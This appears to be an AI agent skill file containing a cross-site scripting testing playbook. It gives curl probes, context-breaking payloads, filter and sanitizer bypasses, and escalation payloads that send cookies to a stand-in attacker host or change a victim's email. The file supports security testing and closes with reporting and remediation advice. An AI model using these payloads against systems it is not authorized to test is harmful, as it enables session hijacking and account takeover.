---
name: xss
description: Cross-Site Scripting playbook — test reflected, stored, DOM, and mXSS vectors; fingerprint context (HTML element, attribute, JS string, JSON), break out with the correct syntax, and escalate to cookie theft / session hijack / account takeover PoC. Use when a parameter is reflected in the response, user content is rendered back (comments, profiles, names), or the app loads a URL/hash/fragment into the DOM.
allowed-tools:
  - http
  - shell
  - web_fetch
  - file_write
---

# XSS playbook

Goal: prove an XSS with a working PoC and concrete impact. Always reproduce first in the browser-less way (curl) to find the reflection point, then verify rendering context.

## 1. Find reflections

```sh
# reflection probe — look for the marker in the response
curl -ksS "https://TARGET/search?q=pfprobe123xyz" | grep -n "pfprobe123xyz"
# reflected in which context? check the surrounding markup
curl -ksS "https://TARGET/search?q=pfprobe123xyz" | grep -o '.\{80\}pfprobe123xyz.\{80\}'
```

Test every input the app echoes: query params, path segments, headers (Referer, User-Agent, X-Forwarded-For) if the app renders them (error pages, admin panels), stored fields (profile name, comment body, title).

## 2. Identify the context

- Between tags: `<div>pfprobe123xyz</div>` → inject `</div><script>alert(document.domain)</script>` (or event handler on an existing element).
- Inside a tag attribute: `value="pfprobe123xyz"` → `"><img src=x onerror=alert(1)>` (break out, or use an event handler without breaking out if quotes are filtered).
- In a JS string: `var q = "pfprobe123xyz";` → `";alert(document.domain);//`.
- In a JSON blob / script block: `{"q":"pfprobe123xyz"}` → `</script><script>alert(1)</script>` or `\u003c`-free direct break.
- Inside `href`/`src`: `javascript:` scheme or `//attacker` (protocol-relative).

Confirm with the shortest payload that executes and is visible in the response — keep the full request/response as evidence.

## 3. Filters & bypasses

```sh
# basic encodings the server may normalize
curl -ksS "https://TARGET/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
# nested / mixed case / entity encoding
curl -ksS "https://TARGET/search?q=%26lt%3Bscript%26gt%3B"
```

- If `<`/`>` stripped: use event handlers inside the existing tag: `" autofocus onfocus=alert(1) x="`.
- If quotes stripped: backtick strings in JS: `` onmouseover=`alert(1)` ``.
- If `alert` blocked: `confirm`, `prompt`, `print`, `fetch('//attacker/?c='+document.cookie)`.
- If a sanitizer is present, test mXSS: sanitizer-triggering payloads like `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>"`.

## 4. Escalate to impact

- Cookie theft: `"><script>new Image().src='//ATTACKER/c?'+document.cookie</script>` — but note `HttpOnly` cookies are invisible; if the session cookie is `HttpOnly`, pivot to CSRF (state-changing XSS: `fetch('/api/change-email',{method:'POST',body:'email=attacker@x.com'})`) or account-takeover chaining.
- Keylogging / form theft via injected script.
- DOM XSS: if the sink is client-side only (location.hash, postMessage, innerHTML), the reflection won't appear in curl — verify with web_fetch on the page JS and describe the sink chain.

## 5. Reporting

Evidence: request URL + payload, the reflected response snippet showing the payload executing, and the impact PoC (alert/document.cookie/state-change). Impact: session hijack, account takeover, phishing/credential theft, admin actions as the victim. Remediation: context-aware output encoding, CSP with nonces, HttpOnly+Secure cookies.

When you have a reproduced execution with evidence, call `confirm_finding`.
